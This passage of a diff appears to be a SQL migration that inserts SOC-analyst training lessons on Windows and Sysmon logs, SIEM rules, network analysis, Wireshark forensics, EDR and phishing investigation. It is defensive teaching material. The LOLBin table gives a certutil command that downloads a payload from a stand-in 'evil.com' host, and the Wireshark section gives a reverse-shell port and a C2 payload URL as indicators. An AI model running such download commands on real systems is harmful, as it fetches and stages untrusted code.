+| **7045** | Service installed | Malware often installs itself as a service |
+
+### Sysmon (System Monitor)
+
+Sysmon is a free Microsoft tool that provides detailed logging far beyond default Windows events:
+
+| Sysmon Event ID | Description | Detection Use |
+|-----------------|-------------|---------------|
+| **1** | Process creation (with full command line, hash, parent process) | Detect malicious processes |
+| **3** | Network connection | Detect C2 (command and control) communication |
+| **7** | Image loaded (DLL) | Detect DLL injection |
+| **11** | File creation | Detect malware dropping files |
+| **13** | Registry modification | Detect persistence mechanisms |
+| **22** | DNS query | Detect DNS-based C2 or data exfiltration |
+
+Sysmon must be installed and configured separately — it is not enabled by default.
+
+## Firewall and Proxy Logs
+
+### Firewall Logs
+
+Firewall logs show allowed and denied connections. Key fields: timestamp, source IP, destination IP, port, protocol, action (allow/deny).
+
+Look for:
+- **Denied outbound** to unusual ports (potential malware trying to phone home).
+- **Allowed inbound** to unexpected services (misconfigured rules).
+- **High volume** from a single source (scanning or DDoS).
+
+### Proxy Logs
+
+Web proxy logs show HTTP/HTTPS requests. Key fields: timestamp, source IP, URL, user agent, response code, bytes transferred.
+
+Look for:
+- Connections to **newly registered domains** or **known malicious URLs**.
+- **Unusual user agents** (malware often uses distinctive strings).
+- **Large uploads** to cloud storage or file-sharing sites (data exfiltration).
+- Access during **off-hours** from user accounts.
+
+## Log Correlation
+
+Correlation combines events from multiple sources to build a picture:
+
+**Example — Detecting Lateral Movement:**
+1. Firewall log: connection from workstation A to server B on port 445 (SMB).
+2. Security log on server B: Event 4624 (logon) from workstation A, logon type 3 (network).
+3. Security log on server B: Event 4672 (admin privileges assigned).
+4. Sysmon on server B: Event 1 (process creation) — `cmd.exe` launched by the logged-in user.
+
+Any single event looks normal. Together, they tell a story: someone on workstation A logged into server B with admin credentials and ran commands.
+
+## Key Takeaways
+
+- Know the critical Windows Event IDs: 4624, 4625, 4648, 4672, 4688, 4720, 4732, 7045.
+- Sysmon provides process, network, and file activity that default Windows logging misses.
+- Firewall logs show network allow/deny; proxy logs show web requests.
+- Correlation across multiple log sources is how analysts detect complex attacks.
+$md$, 35, 1),
+
+('b0000000-0000-4000-8000-000000000043', 'SIEM Correlation and Use Cases',
+ 'SIEM architecture, correlation rules, use case development, and alert tuning.',
+$md$
+# SIEM Correlation and Use Cases
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe SIEM architecture and how logs flow into the system.
+- Explain correlation rules and how they detect threats.
+- Design basic SIEM use cases for common attack patterns.
+- Describe alert tuning to reduce false positives.
+
+## SIEM Architecture
+
+A Security Information and Event Management (SIEM) system collects, normalises, correlates, and stores security events from across the environment.
+
+### Data Flow
+
+1. **Collection** — agents or syslog forward logs from endpoints, servers, firewalls, proxies, cloud services, and applications.
+2. **Parsing and normalisation** — raw logs are parsed into structured fields (timestamp, source, destination, action, user). Different log formats are normalised to a common schema.
+3. **Enrichment** — events are enriched with context: threat intelligence (is this IP known-bad?), asset data (is this a critical server?), user data (is this an admin?).
+4. **Correlation** — rules and algorithms compare events to detect patterns that indicate threats.
+5. **Alerting** — matched rules generate alerts for analyst review.
+6. **Storage and search** — all events are indexed for investigation and compliance.
+
+## Correlation Rules
+
+A correlation rule defines a pattern of events that indicates a threat. Types:
+
+| Rule Type | Description | Example |
+|-----------|-------------|---------|
+| **Single event** | One event triggers the alert | "Alert on any Event 4720 (account created) outside business hours" |
+| **Threshold** | Count of events exceeds a limit in a time window | "More than 10 failed logins (4625) in 5 minutes from one source" |
+| **Sequence** | Events occur in a specific order | "Failed logins followed by successful login followed by new process creation" |
+| **Aggregation** | Group events and trigger when a condition is met | "More than 5 unique hosts contacted by one source in 10 minutes (potential scanning)" |
+| **Absence** | Expected event does NOT occur | "No heartbeat from critical server for 15 minutes" |
+
+## Designing Use Cases
+
+A SIEM use case documents: what threat it detects, what data sources are needed, the correlation logic, and the response procedure.
+
+**Example Use Case — Brute Force Detection:**
+
+| Field | Value |
+|-------|-------|
+| **Threat** | Credential brute-force attack |
+| **Data source** | Windows Security Log, VPN logs |
+| **Logic** | More than 20 Event 4625 (failed logon) from a single source IP within 10 minutes, followed by Event 4624 (successful logon) from the same IP within 30 minutes |
+| **Alert priority** | High (if successful logon follows); Medium (if only failures) |
+| **Response** | Investigate source IP, check if account is compromised, consider blocking IP |
+
+## Alert Tuning
+
+Raw SIEM rules produce many false positives. Tuning reduces noise:
+
+- **Whitelisting** — exclude known-good activity (e.g. exclude the vulnerability scanner's IP from brute-force rules).
+- **Threshold adjustment** — increase the threshold if too many alerts (e.g. from 5 to 20 failures).
+- **Time-based tuning** — suppress alerts during scheduled maintenance windows.
+- **Context enrichment** — only alert if the target is a critical asset or the user is an admin.
+
+The goal is not zero false positives — it is an acceptable ratio where analysts can investigate every alert efficiently.
+
+## Key Takeaways
+
+- SIEMs collect, normalise, correlate, and alert on security events from across the environment.
+- Correlation rules match patterns: single events, thresholds, sequences, aggregations, and absences.
+- Good use cases specify the threat, data sources, logic, priority, and response.
+- Alert tuning (whitelisting, threshold adjustment, context enrichment) is essential to reduce noise.
+$md$, 30, 2),
+
+('b0000000-0000-4000-8000-000000000043', 'Network Traffic Analysis',
+ 'NetFlow, packet capture as a SOC activity, and baseline deviation detection.',
+$md$
+# Network Traffic Analysis
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe NetFlow and its use in network monitoring.
+- Explain how packet capture supports SOC investigations.
+- Identify baseline deviations that indicate threats.
+- Describe common network-based indicators of compromise.
+
+## NetFlow
+
+NetFlow (and its equivalents — sFlow, IPFIX) records metadata about network conversations without capturing full packet content.
+
+A flow record typically includes: source IP, destination IP, source port, destination port, protocol, byte count, packet count, timestamps, and TCP flags.
+
+### NetFlow vs Full Packet Capture
+
+| | NetFlow | Full Packet Capture |
+|-|---------|-------------------|
+| **Data volume** | Small (metadata only) | Very large (all content) |
+| **Storage** | Weeks to months | Hours to days |
+| **Visibility** | Who talked to whom, how much, when | Full content of communications |
+| **Use case** | Trend analysis, anomaly detection, forensic scoping | Deep investigation, malware analysis, evidence |
+| **Privacy** | Less intrusive | Captures sensitive content |
+
+### What NetFlow Reveals
+
+- **Data exfiltration** — unusually large outbound transfers to unfamiliar destinations.
+- **Lateral movement** — internal host-to-host communication on unexpected ports.
+- **C2 beaconing** — regular, periodic connections to an external IP (e.g. every 60 seconds).
+- **Scanning** — one host connecting to many hosts on the same port in rapid succession.
+
+## Baseline Deviations
+
+A baseline represents normal network behaviour. Deviations from the baseline are potential indicators:
+
+| Baseline Metric | Normal | Anomaly | Possible Threat |
+|----------------|--------|---------|----------------|
+| Outbound traffic volume | 5 GB/day | 50 GB in 2 hours | Data exfiltration |
+| DNS query rate | 200/hour | 10,000/hour | DNS tunnelling |
+| Connections to new external IPs | 50/day | 500/day | Malware C2 |
+| Internal traffic patterns | Mostly client→server | Server→server spike | Lateral movement |
+
+## Network-Based Indicators of Compromise
+
+| Indicator | Description | Detection Method |
+|-----------|-------------|-----------------|
+| **Beaconing** | Regular, periodic outbound connections (e.g. every 60s or with jitter) | NetFlow analysis, time-series analysis |
+| **DNS tunnelling** | Data encoded in DNS queries to exfiltrate data or receive commands | High DNS query volume, long/random-looking subdomains |
+| **Known-bad IPs/domains** | Communication with threat-intelligence-flagged destinations | SIEM enrichment with threat feeds |
+| **Protocol anomalies** | Unexpected protocols on standard ports (e.g. non-HTTP on port 80) | Deep packet inspection, protocol analysis |
+| **Certificate anomalies** | Self-signed certificates, mismatched CN, expired certs on TLS connections | TLS inspection, certificate monitoring |
+
+## Key Takeaways
+
+- NetFlow records who talked to whom and how much — without capturing content.
+- Full packet capture is needed for deep investigation but generates massive data volumes.
+- Baseline deviations (volume, frequency, destinations) are primary indicators of compromise.
+- C2 beaconing, DNS tunnelling, and lateral movement are detectable through network analysis.
+$md$, 30, 3),
+
+('b0000000-0000-4000-8000-000000000043', 'Packet Forensics with Wireshark',
+ 'Using Wireshark for incident investigation, stream analysis, and IOC extraction.',
+$md$
+# Packet Forensics with Wireshark
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Open and navigate PCAP files in Wireshark.
+- Use Statistics views to build situational awareness.
+- Apply display filters to isolate suspicious traffic.
+- Follow TCP streams to reconstruct communications.
+- Extract indicators of compromise (IOCs) from packet data.
+
+## Forensic Analysis Workflow
+
+When investigating a network incident with a PCAP file, follow this workflow:
+
+### Step 1 — Situational Awareness
+
+Open the PCAP and check:
+- **Statistics → Capture File Properties** — total packets, time span, average packets per second.
+- **Statistics → Protocol Hierarchy** — what protocols are present? Is there unexpected traffic (e.g. IRC, Telnet, or unusual protocols)?
+- **Statistics → Endpoints (IPv4)** — how many unique hosts? Sort by packets or bytes to find the most active.
+- **Statistics → Conversations (TCP)** — which pairs communicated most? Large transfers may indicate exfiltration.
+
+### Step 2 — Filter and Focus
+
+Apply display filters to zoom in:
+
+```
+http.request                          # HTTP requests
+dns.qry.name contains "suspicious"    # DNS queries for specific domains
+tcp.port == 4444                      # Common Metasploit reverse shell port
+ip.addr == 10.0.0.5 && http           # HTTP traffic from/to specific host
+tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN packets only (connection attempts)
+```
+
+### Step 3 — Reconstruct Conversations
+
+Right-click a packet of interest → **Follow → TCP Stream**. This shows the full conversation in readable text. For HTTP traffic, you will see:
+- The request (method, URL, headers, body).
+- The response (status code, headers, body).
+
+Look for: credentials in cleartext, commands executed, files transferred, user-agent strings.
+
+### Step 4 — Extract IOCs
+
+From your analysis, document:
+
+| IOC Type | Example | Where Found |
+|----------|---------|-------------|
+| **IP address** | 203.0.113.42 | Endpoint statistics, conversation view |
+| **Domain** | evil-c2.example.com | DNS queries (`dns.qry.name`) |
+| **URL** | http://evil-c2.example.com/payload.exe | HTTP requests |
+| **User-Agent** | Mozilla/4.0 (compatible; MSIE 6.0) | HTTP request headers (outdated = suspicious) |
+| **File hash** | (export file from PCAP, then hash it) | File → Export Objects → HTTP |
+| **Port** | 4444 (reverse shell) | Conversation view, filter |
+
+### Step 5 — Timeline
+
+Build a timeline from packet timestamps:
+1. First suspicious DNS query → attacker establishing C2.
+2. HTTP POST with encoded data → data exfiltration.
+3. Connection to internal host on port 445 → lateral movement.
+
+## Exporting Objects
+
+**File → Export Objects → HTTP** shows all files transferred over HTTP in the capture. You can save them for malware analysis. **Caution:** exported files may be actual malware — handle in an isolated environment.
+
+## Key Takeaways
+
+- Start with Statistics views to understand the capture before filtering.
+- Display filters are essential — know http.request, dns.qry.name, ip.addr, tcp.port.
+- Follow TCP Stream reconstructs full conversations for analysis.
+- Extract and document IOCs: IPs, domains, URLs, user agents, file hashes.
+- Build a timeline from packet timestamps to understand the attack sequence.
+$md$, 35, 4);
+
+-- ========== BH-OPS-2: Module 4 — Vulnerability and Endpoint Management ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000044', 'Vulnerability Scanning in Depth',
+ 'Scanner types, scan policies, credentialed vs uncredentialed, and remediation tracking.',
+$md$
+# Vulnerability Scanning in Depth
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Distinguish vulnerability scanners from penetration testing.
+- Describe credentialed vs uncredentialed scans and when to use each.
+- Explain scan policies, scheduling, and scope.
+- Describe vulnerability remediation tracking and exception management.
+
+## Vulnerability Assessment vs Penetration Testing
+
+| | Vulnerability Assessment | Penetration Test |
+|-|------------------------|-----------------|
+| **Goal** | Identify vulnerabilities | Exploit vulnerabilities to prove impact |
+| **Scope** | Broad (all systems) | Focused (specific targets) |
+| **Frequency** | Regular (weekly/monthly) | Periodic (annual/after major changes) |
+| **Automation** | Highly automated | Mostly manual with some automation |
+| **Risk** | Low (non-intrusive) | Higher (exploitation may cause disruption) |
+| **Output** | List of vulnerabilities with severity | Report demonstrating real impact |
+
+## Scanner Types
+
+| Scanner | Focus |
+|---------|-------|
+| **Network vulnerability scanner** (e.g. Nessus, Qualys, OpenVAS) | Scan hosts for missing patches, misconfigurations, known CVEs |
+| **Web application scanner** (e.g. Burp Suite, OWASP ZAP, nikto) | Scan web applications for SQLi, XSS, misconfigurations |
+| **Cloud security posture management (CSPM)** | Scan cloud configurations for security issues |
+| **Container scanner** (e.g. Trivy, Snyk) | Scan container images for vulnerable packages |
+
+## Credentialed vs Uncredentialed Scans
+
+| | Credentialed | Uncredentialed |
+|-|-------------|----------------|
+| **Access** | Scanner logs in to the target (SSH, WMI, SNMP) | Scanner only checks from the network |
+| **Depth** | Deep — can check installed software versions, registry settings, file permissions | Surface — only sees what is network-exposed |
+| **Accuracy** | Higher — fewer false positives and false negatives | Lower — may miss internal vulnerabilities |
+| **Use case** | Regular compliance and patch verification | External-facing assessment, initial discovery |
+
+**Best practice:** Run credentialed scans internally on a regular schedule. Run uncredentialed scans against your external perimeter.
+
+## Scan Policies and Scheduling
+
+A **scan policy** defines: which checks to run (all, only critical, compliance-specific), intensity (how aggressively to probe), and exclusions (fragile systems, medical devices).
+
+Scheduling:
+- **Weekly** or **monthly** for routine scans.
+- **After changes** — new deployments, patches, configuration changes.
+- **Maintenance windows** — scan during off-hours to minimise impact.
+- **Continuous** — some organisations run rolling scans that cover all assets over a period.
+
+## Remediation Tracking
+
+Scanning without remediation is pointless. A mature programme tracks:
+
+| Metric | Description |
+|--------|-------------|
+| **Mean time to remediate (MTTR)** | Average time from discovery to fix |
+| **SLA by severity** | Critical: 7 days, High: 30 days, Medium: 90 days, Low: next cycle |
+| **Exception/waiver** | Documented risk acceptance when a vulnerability cannot be fixed (e.g. legacy system) |
+| **Recurrence rate** | How often the same vulnerability reappears (indicates process failure) |
+
+## Key Takeaways
+
+- Vulnerability scanning is automated and broad; penetration testing is manual and focused.
+- Credentialed scans find more issues than uncredentialed scans.
+- Scan policies control what is tested and how aggressively.
+- Remediation tracking with SLAs ensures vulnerabilities are actually fixed.
+$md$, 30, 1),
+
+('b0000000-0000-4000-8000-000000000044', 'Endpoint Detection and Response',
+ 'EDR concepts, behavioural detection, process monitoring, and response actions.',
+$md$
+# Endpoint Detection and Response
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe what EDR is and how it differs from traditional antivirus.
+- Explain behavioural detection and its advantages.
+- Describe common EDR response actions.
+- Identify key endpoint telemetry for threat detection.
+
+## EDR vs Traditional Antivirus
+
+| | Traditional Antivirus | EDR |
+|-|----------------------|-----|
+| **Detection method** | Signature-based (known malware signatures) | Behavioural + signatures + ML |
+| **Visibility** | File scanning only | Process activity, network connections, file changes, registry modifications |
+| **Response** | Block/quarantine file | Isolate host, kill process, collect forensic data, rollback changes |
+| **Investigation** | Limited | Full timeline of endpoint activity |
+| **Scope** | Individual endpoint | Centrally managed across all endpoints |
+
+EDR agents collect rich telemetry from endpoints and send it to a central console. Analysts can search across all endpoints for indicators of compromise.
+
+## Behavioural Detection
+
+Instead of looking for known malware signatures, behavioural detection watches for suspicious **behaviour**:
+
+| Behaviour | Why It Is Suspicious |
+|-----------|---------------------|
+| PowerShell executing encoded commands | Common malware technique to evade detection |
+| Word document spawning cmd.exe | Macro-based malware |
+| Process injecting into another process | DLL injection, process hollowing |
+| Unusual outbound connection from a server | Potential C2 communication |
+| New service installed outside change window | Persistence mechanism |
+| Credential dumping tools (e.g. mimikatz signatures) | Credential theft |
+
+## EDR Response Actions
+
+When a threat is detected, analysts can:
+
+| Action | Description |
+|--------|-------------|
+| **Isolate host** | Cut network access while maintaining management connection to EDR |
+| **Kill process** | Terminate the malicious process |
+| **Quarantine file** | Move the malicious file to a secure container |
+| **Collect forensic package** | Grab memory dump, event logs, and process list for analysis |
+| **Rollback** | Some EDR tools can reverse changes made by ransomware |
+| **Block hash** | Prevent the file from executing on any endpoint |
+
+## Key Takeaways
+
+- EDR provides visibility into endpoint behaviour far beyond what antivirus offers.
+- Behavioural detection catches threats that signature-based tools miss.
+- Response actions (isolate, kill, quarantine, collect) let analysts contain threats remotely.
+- EDR telemetry (processes, connections, file changes) is essential for investigation.
+$md$, 25, 2),
+
+('b0000000-0000-4000-8000-000000000044', 'Patch Management and Configuration Compliance',
+ 'Patch lifecycle, CIS benchmarks, configuration baselines, and compliance scanning.',
+$md$
+# Patch Management and Configuration Compliance
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe the patch management lifecycle.
+- Explain CIS Benchmarks and security baselines.
+- Describe configuration compliance scanning.
+- Identify patch management challenges and best practices.
+
+## Patch Management Lifecycle
+
+1. **Inventory** — maintain an accurate asset inventory. You cannot patch what you do not know about.
+2. **Monitor** — track vendor advisories, CVEs, and security bulletins for your software and OS versions.
+3. **Assess** — evaluate each patch: severity, exploitability, affected systems, business impact.
+4. **Test** — apply the patch in a test environment to check for compatibility issues.
+5. **Deploy** — roll out to production, often in waves (pilot group first, then broader).
+6. **Verify** — confirm patches applied successfully (scan or check version numbers).
+7. **Document** — record what was patched, when, and any issues encountered.
+
+### Patch Priority
+
+| Severity | Example | SLA |
+|----------|---------|-----|
+| **Critical** | Remote code execution, actively exploited | 48–72 hours |
+| **High** | Privilege escalation, significant impact | 7–14 days |
+| **Medium** | Information disclosure, limited impact | 30 days |
+| **Low** | Minor bugs, defence-in-depth improvements | Next maintenance cycle |
+
+## CIS Benchmarks
+
+The **Center for Internet Security (CIS)** publishes free, consensus-based configuration guidelines for operating systems, cloud services, databases, and applications.
+
+A CIS Benchmark specifies hundreds of configuration settings. Examples for Windows Server:
+
+| Setting | CIS Recommendation | Rationale |
+|---------|-------------------|-----------|
+| Account lockout threshold | 5 invalid attempts | Prevents brute force |
+| Minimum password length | 14 characters | Strengthens passwords |
+| Audit logon events | Success and Failure | Enables detection |
+| Remote Desktop | Disable if not needed | Reduces attack surface |
+
+CIS also publishes **CIS Controls** — a prioritised set of 18 security actions (e.g. inventory hardware, inventory software, configure securely, control admin privileges).
+
+## Configuration Compliance Scanning
+
+Tools like **Nessus**, **Qualys**, and **SCAP-compliant scanners** can check systems against CIS Benchmarks or DISA STIGs (Security Technical Implementation Guides) and report deviations.
+
+Output: a compliance score (e.g. 85% compliant) with specific failed checks and remediation guidance.
+
+## Key Takeaways
+
+- Patch management is a lifecycle: inventory → monitor → assess → test → deploy → verify → document.
+- CIS Benchmarks provide specific, tested configuration recommendations.
+- Configuration compliance scanning automates the verification of security baselines.
+- Patching critical vulnerabilities within 48–72 hours is industry best practice.
+$md$, 25, 3),
+
+('b0000000-0000-4000-8000-000000000044', 'Access Controls for Security Operations',
+ 'Access control models, AAA, 802.1X, and NAC in an operational context.',
+$md$
+# Access Controls for Security Operations
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe access control models (DAC, MAC, RBAC, ABAC) in an operational context.
+- Explain AAA (Authentication, Authorization, Accounting) and its protocols.
+- Describe 802.1X and Network Access Control (NAC).
+- Identify access control weaknesses that SOC analysts should monitor.
+
+## Access Control Models Review
+
+| Model | Description | Example |
+|-------|-------------|---------|
+| **DAC** (Discretionary) | Owner controls access | File owner sets read/write permissions |
+| **MAC** (Mandatory) | System enforces access based on labels | Military: Top Secret document can only be read by Top Secret-cleared users |
+| **RBAC** (Role-Based) | Access based on job role | "Finance Analyst" role can view invoices but not approve payments |
+| **ABAC** (Attribute-Based) | Access based on attributes (user, resource, environment) | "Allow if user.department=Finance AND resource.classification=Internal AND time=BusinessHours" |
+
+## AAA — Authentication, Authorization, Accounting
+
+| Component | Question | Example |
+|-----------|----------|---------|
+| **Authentication** | Who are you? | Username + password + MFA token |
+| **Authorization** | What can you do? | Role-based permissions, group memberships |
+| **Accounting** | What did you do? | Audit logs, session logs, command logs |
+
+### AAA Protocols
+
+| Protocol | Use Case | Notes |
+|----------|----------|-------|
+| **RADIUS** | Network access (Wi-Fi, VPN) | UDP-based, encrypts only the password |
+| **TACACS+** | Network device administration (routers, switches) | TCP-based, encrypts the entire session |
+| **Kerberos** | Enterprise authentication (Active Directory) | Ticket-based, SSO within a domain |
+
+## 802.1X — Port-Based Network Access Control
+
+802.1X requires devices to authenticate before gaining network access. Components:
+
+- **Supplicant** — the device requesting access (e.g. laptop with 802.1X client).
+- **Authenticator** — the switch or wireless access point that controls the port.
+- **Authentication server** — RADIUS server that verifies credentials.
+
+Flow: Device connects → port is blocked → device sends credentials → switch forwards to RADIUS → RADIUS approves/denies → port is opened/remains blocked.
+
+**EAP (Extensible Authentication Protocol)** is the framework used within 802.1X. Common types: EAP-TLS (certificate-based, most secure), PEAP (password-based with TLS tunnel), EAP-FAST.
+
+## NAC (Network Access Control)
+
+NAC goes beyond 802.1X by also checking the **health** of the device:
+
+- Is the OS patched?
+- Is antivirus installed and up to date?
+- Is the firewall enabled?
+- Is the device managed (domain-joined)?
+
+Devices that fail health checks can be placed in a **quarantine VLAN** with limited access until they are remediated.
+
+## What SOC Analysts Should Monitor
+
+| Indicator | Why |
+|-----------|-----|
+| Logon from unusual location or time | Potential compromised credentials |
+| Account used on multiple devices simultaneously | Credential sharing or theft |
+| Privilege escalation (added to admin group) | Potential unauthorised elevation |
+| Service account used interactively | Service accounts should not be used by humans |
+| Failed MFA followed by successful bypass | MFA fatigue or social engineering |
+
+## Key Takeaways
+
+- RBAC and ABAC are the most commonly deployed models in enterprises.
+- RADIUS handles network access; TACACS+ handles device administration; Kerberos handles Windows domain auth.
+- 802.1X + NAC ensures only authenticated, healthy devices access the network.
+- SOC analysts should monitor for unusual logon patterns, privilege changes, and MFA anomalies.
+$md$, 30, 4);
+
+-- ========== BH-SPEC-SOC: Module 3 — Advanced Detection and Analysis ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000053', 'Windows Event Log Analysis',
+ 'Critical Event IDs, Sysmon analysis, and building detection logic from Windows events.',
+$md$
+# Windows Event Log Analysis
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Analyse Windows Security events to detect authentication attacks.
+- Use Sysmon events to detect process-based threats.
+- Build detection logic from event patterns.
+- Describe common attack patterns visible in Windows logs.
+
+## Authentication Attack Detection
+
+### Brute Force / Password Spray
+
+**Pattern:** Many Event 4625 (failed logon) in a short window.
+
+- **Brute force** — many failures against **one account** from one or few sources.
+- **Password spray** — few failures against **many accounts** (e.g. trying "Password1" on every account).
+
+Detection logic: "More than 20 Event 4625 from the same source IP in 10 minutes" or "More than 10 unique accounts with Event 4625 from the same source in 5 minutes."
+
+### Credential Stuffing
+
+Similar to brute force but uses credentials leaked from other breaches. Pattern: many 4625s with different usernames, often from distributed IPs.
+
+### Lateral Movement with Explicit Credentials
+
+**Event 4648** — "A logon was attempted using explicit credentials." This fires when someone uses `runas` or passes credentials explicitly. Combined with **Event 4624 Logon Type 3** (network logon) on the target, this indicates credential-based lateral movement.
+
+### Pass-the-Hash / Pass-the-Ticket
+
+**Event 4624 Logon Type 9** (NewCredentials) or **Type 3** from unexpected sources. The NTLM authentication package in the event details (rather than Kerberos) may indicate pass-the-hash.
+
+## Sysmon Process Analysis
+
+### Suspicious Process Creation (Sysmon Event 1)
+
+Key fields: `Image` (executable path), `CommandLine` (full command), `ParentImage` (what launched it), `Hashes` (file hash).
+
+| Pattern | Example | Threat |
+|---------|---------|--------|
+| Office app → cmd.exe/powershell.exe | ParentImage: WINWORD.EXE, Image: cmd.exe | Macro-based malware |
+| Encoded PowerShell | CommandLine contains `-enc` or `-EncodedCommand` | Obfuscated malicious script |
+| Process from unusual path | Image: C:\Users\Public\svchost.exe | Malware masquerading as system process |
+| Living off the land | certutil.exe, mshta.exe, regsvr32.exe, wmic.exe used for download/execution | LOLBin abuse |
+
+### LOLBins (Living Off The Land Binaries)
+
+Attackers use legitimate Windows tools to avoid detection:
+
+| Binary | Legitimate Use | Malicious Use |
+|--------|---------------|---------------|
+| `certutil.exe` | Certificate management | Download files: `certutil -urlcache -f http://evil.com/payload.exe` |
+| `mshta.exe` | Run HTA files | Execute remote scripts |
+| `regsvr32.exe` | Register DLLs | Execute arbitrary code via COM scriptlets |
+| `wmic.exe` | WMI management | Remote execution, reconnaissance |
+
+## Key Takeaways
+
+- Brute force shows many 4625s against one account; password spray shows failures across many accounts.
+- Event 4648 + Event 4624 Type 3 on a target = lateral movement.
+- Sysmon Event 1 with full command line is the most valuable detection data source.
+- LOLBin abuse is a top technique — monitor certutil, mshta, regsvr32, wmic for unusual usage.
+$md$, 35, 1),
+
+('b0000000-0000-4000-8000-000000000053', 'Email Header Analysis and Phishing Investigation',
+ 'Analyse email headers to trace origins, identify spoofing, and investigate phishing campaigns.',
+$md$
+# Email Header Analysis and Phishing Investigation
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Read and interpret email headers to trace the path of a message.
+- Identify spoofed emails by examining SPF, DKIM, and DMARC results.
+- Analyse suspicious URLs and attachments safely.
+- Document phishing incidents with IOCs.
+
+## Email Headers
+
+Every email contains headers that record its journey from sender to recipient. Key headers:
+
+| Header | Purpose |
+|--------|---------|
+| **From** | Claimed sender (can be spoofed) |
+| **Return-Path** | Actual envelope sender |
+| **Received** | Added by each mail server the message passes through (read bottom to top) |
+| **Message-ID** | Unique identifier |
+| **X-Originating-IP** | IP address of the sending client |
+| **Authentication-Results** | SPF, DKIM, DMARC results |
+
+### Reading the Received Chain
+
+Read `Received:` headers from **bottom to top** — the bottom one is the originating server:
+
+```
+Received: from mail.example.com (mail.example.com [93.184.216.34])
+    by mx.recipient.com with ESMTPS; Tue, 10 Feb 2026 08:15:00 +0000
+```
+
+This tells you: the message came from mail.example.com (IP 93.184.216.34) and was received by mx.recipient.com.
+
+### SPF/DKIM/DMARC in Headers
+
+```
+Authentication-Results: mx.recipient.com;
+    spf=pass (sender IP is 93.184.216.34) smtp.mailfrom=example.com;
+    dkim=pass header.d=example.com;
+    dmarc=pass (policy=reject)
+```
+
+If any of these show `fail`, the email may be spoofed.
+
+## Phishing Analysis Checklist
+
+1. **Check sender** — does the From address match the organisation? Look for typosquatting (e.g. `examp1e.com`).
+2. **Check headers** — does SPF/DKIM pass? Is the originating IP consistent with the claimed sender?
+3. **Check URLs** — hover (do not click). Does the URL match the claimed destination? Use URL reputation services.
+4. **Check attachments** — what file type? Macros? Submit hash to VirusTotal.
+5. **Check urgency/language** — phishing often creates urgency ("Your account will be suspended").
+6. **Check for similar emails** — search the SIEM/email gateway for other recipients of the same message.
+
+## Safely Analysing URLs and Attachments
+
+- **URLs:** Use URL scanners (urlscan.io, VirusTotal) to check without visiting.
+- **Attachments:** Check file hash on VirusTotal. If unknown, analyse in a sandbox (isolated environment).
+- **Never** open suspicious attachments on a production system.
+
+## Key Takeaways
+
+- Read Received headers bottom-to-top to trace the email path.
+- SPF/DKIM/DMARC failures in Authentication-Results indicate potential spoofing.
+- Phishing analysis: check sender, headers, URLs, attachments, urgency, and scope.
+- Use sandboxes and reputation services — never interact with suspicious content on production systems.
+$md$, 30, 2),
+
+('b0000000-0000-4000-8000-000000000053', 'Endpoint Detection and Response in Practice',
+ 'EDR workflows, investigation techniques, and response playbooks for SOC analysts.',
+$md$
+# Endpoint Detection and Response in Practice
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe the EDR investigation workflow for a SOC analyst.
+- Analyse process trees to identify malicious activity chains.
+- Use EDR search capabilities to hunt across endpoints.
+- Execute common response actions through EDR consoles.
+
+## EDR Investigation Workflow
+
+When an EDR alert fires, the SOC analyst follows this workflow:
+
+1. **Review the alert** — what was detected? What rule or behaviour triggered it?
+2. **Examine the process tree** — trace the chain: what launched what. A suspicious chain might be: `outlook.exe → cmd.exe → powershell.exe → payload.exe`.
+3. **Check the command line** — what arguments were passed? Encoded commands, download URLs, and file paths are critical.
+4. **Review network activity** — did the process make outbound connections? To which IPs/domains?
+5. **Check file activity** — did it create, modify, or delete files? What are their hashes?
+6. **Search across endpoints** — is the same IOC (hash, domain, file path) present on other hosts?
+7. **Determine scope** — how many endpoints are affected?
+8. **Respond** — isolate, kill, quarantine, collect forensics.
+
+## Process Tree Analysis
+
+A process tree shows the parent-child relationship of processes. Normal patterns:
+
+```
+explorer.exe → chrome.exe        (user launched browser — normal)
+services.exe → svchost.exe       (system service — normal)
+winlogon.exe → userinit.exe      (login process — normal)
+```
+
+Suspicious patterns:
+
+```
+outlook.exe → cmd.exe → powershell.exe   (email → command execution — likely malware)
+svchost.exe → cmd.exe → whoami           (service running recon — likely compromised)
+excel.exe → mshta.exe                    (spreadsheet running HTA — macro malware)
+```
+
+The key questions: Is the parent-child relationship expected? Is the command line suspicious? Is the file hash known-bad?
+
+## Cross-Endpoint Hunting
+
+EDR consoles allow searching across all managed endpoints:
+
+- **Search by hash:** "Show all endpoints where file hash abc123 has been seen in the last 30 days."
+- **Search by domain:** "Show all endpoints that connected to evil-c2.example.com."
+- **Search by process name:** "Show all endpoints where certutil.exe was used to download a file."
+
+This scoping determines whether an incident is isolated or widespread.
+
+## Response Playbook: Malware Execution
+
+1. **Isolate** the affected endpoint from the network.
+2. **Kill** the malicious process.
+3. **Quarantine** the malicious file.
+4. **Collect** forensic package (memory dump, logs, process list).
+5. **Search** for the file hash and C2 domain across all endpoints.
+6. **Block** the hash and C2 domain in EDR and firewall.
+7. **Investigate** how the malware was delivered (email? web download? USB?).
+8. **Remediate** — remove malware, reset credentials if needed, scan for persistence.
+9. **Document** and create incident report.
+
+## Key Takeaways
+
+- Process tree analysis is the core EDR investigation technique — trace parent-child chains.
+- Suspicious patterns: Office apps spawning cmd/powershell, services running recon commands.
+- Cross-endpoint hunting determines incident scope — search by hash, domain, or behaviour.
+- Response follows: isolate → kill → quarantine → collect → search → block → investigate → remediate.
+$md$, 30, 3),
+
+('b0000000-0000-4000-8000-000000000053', 'Malware Triage and Sandboxing',
+ 'Static and dynamic malware analysis, sandbox tools, and IOC extraction.',
+$md$
+# Malware Triage and Sandboxing
+
+## Objectives
+
